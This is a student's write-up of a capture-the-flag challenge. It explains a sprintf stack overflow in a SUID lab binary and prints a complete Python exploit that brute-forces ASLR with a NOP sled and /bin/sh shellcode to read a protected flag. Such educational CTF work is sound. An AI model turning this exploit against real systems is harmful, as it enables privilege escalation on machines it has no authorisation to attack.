# Homework #1 Write-up

## Personal Details
Full name: **Theodoros Moraitis** (Θεόδωρος Μωραΐτης) <br>
StudentID: **sdi2000150** (1115202000150) <br>
HackCenter username: **teomor** (provided in the `username` file too)

## Intro
In this write-up, I describe how I solved one of the challenges from the first Capture-The-Flag (CTF) Competition (Unix, Reverse Engineering & Binary Exploitation).
One of the most difficult and interesting challenges I solved was **Mission Impossible 1**.

## Mission Impossible 1: Brute-Forcing a Shellcode Injection into an ASLR binary
**Mission Impossible 1** is a binary-exploitation type of CTF challenge, in which the target is
a SUID binary (`/bomb/welcome`) running with `secret:secret` privileges (`-rwsr-sr-x 1 secret secret`) on a remote server, and the objective is to exploit it 
and read the flag at `/bomb/flag`, which also belongs to `secret` (`-rw-r----- 1 secret secret`). These privileges mean that I am, as guest-agent, able to run the `welcome` binary,
but not permitted to open the `flag` file. The challenge is made more difficult than a classic buffer overflow, as the binary (`/bomb/welcome`) has ASLR (Address Space Layout Randomization) enabled.
Luckily stack canaries are not present in the program (so we can overwrite the return address without triggering a stack smashing detection) and NX is disabled (so we are allowed to execute code on the stack).

## Vulnerability Details
After testing with gdb, disassembling and decompiling the `welcome` program I found that the vulnerability is in the vuln() function, which uses sprintf() to copy user input into a fixed-size stack buffer (char s[size]) without bounds checking (the size of the buffer seems to change in each ssh connection but it stays fixed in each one):
```c
sprintf(s, "Welcome, %s!", arg1);
```
This allows a stack buffer overflow attack.

## Exploitation Strategy
The strategy is a buffer overflow - control hijack attack: **[junk data][return address][nopsled][shellcode]**. <br>
But having ASLR enabled means that I cannot rely on fixed addresses for my return address overwrite pointing to my nopsled->shellcode. To overcome this, I tried a **brute-force approach**:

1. Determine Buffer Size: It seems that every time the remote shell is being run, the buffer size differs, so as soon as I ssh to the server I must quickly determine the buffer size and more specifically
how many bytes are needed to overwrite the return address (through iterative testing with gdb, I found that, in the successful run, sending 499 bytes of junk data ('A' characters) would overwrite the return address,
so 495 bytes was the exact amount of junk data needed).

3. Construct Payload:
    - Junk Data: 495 bytes to reach the return address.
    - Return Address: Multiple instances of a guessed stack address pointing into our NOP sled.
    - NOP Sled: A large sequence of NOP (\x90) instructions to increase the likelihood of landing in the shellcode.
    - Shellcode: Provided in the challenge, designed to execute /bin/sh.

4. Brute-Force Execution: Repeatedly execute the binary with the crafted payload until the return address correctly points into the nopsled, resulting in shellcode execution.

5. Successful Shell Access and `cat flag`

## Exploit Script
The following script was used to exploit the vulnerable program (`/bomb/welcome`). To run it I created an `exploit.py` file inside the `/home/agent` directory of the remote server where I had privileges to create it, make it executable with `chmod +x`, and execute it. So, this is the script:
```python
#!/usr/bin/python

import struct
from subprocess import Popen

# exec /bin/sh (shellcode given)
shellcode = b"\x31\xC0\xF7\xE9\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x68\x2D\x69\x69\x69\x89\xE6\x50\x56\x53\x89\xE1\xB0\x0B\xCD\x80"

bufsize = 495
nopsize = 4096

def prep_buffer(addr_buffer):
    buf = b"A" * (bufsize)                              # [junk data] (found to be 495 bytes in current execution, but it changes in every new ssh connection)
    buf += struct.pack("<I",addr_buffer+bufsize+4)*16   # [return address] (multiplied 16 times to be sure it overwrites the return address)
    buf += b"\x90" * nopsize                            # [nop sled] (a big enough nopsled, 4096 worked fine with the current brute force)
    buf += shellcode                                    # [shellcode] (exec /bin/sh)     
    return buf

def brute_aslr(buf):
    p = Popen(['/bomb/welcome', buf]).wait()

if __name__ == '__main__':
    addr_buffer = 0xffaa5540    # found after running the program in gdb in successful execution, this is the value of SP when the program segfaults and IP is 0x41414141
    buf = prep_buffer(addr_buffer)
    i = 0
    while True:                 # repeat - brute force the execution until the return address (overwritted) successfully hits into the nopsled->shellcode, and /bin/sh is executed
        print(i)
        brute_aslr(buf)
        i += 1
```

## Outcome
```bash
agent@ae628fb9c5db[00:05:12]:/bomb$ cat flag                                           
cat: flag: Permission denied
agent@ae628fb9c5db[00:05:12]:/bomb$ cd /home/agent
agent@ae628fb9c5db[00:06:23]:~$ ./exploit
...
~$ cat /bomb/flag
# flag 
```

## Resources
To understand what the program did and where the vulnerability lay, the following tools helped a lot: <br>
https://dogbolt.org/    <br>
https://hex-rays.com/ida-free    <br>
For the solution script I created, the following link was really helpful: <br>
https://taishi8117.github.io/2015/11/11/stack-bof-2/    <br>


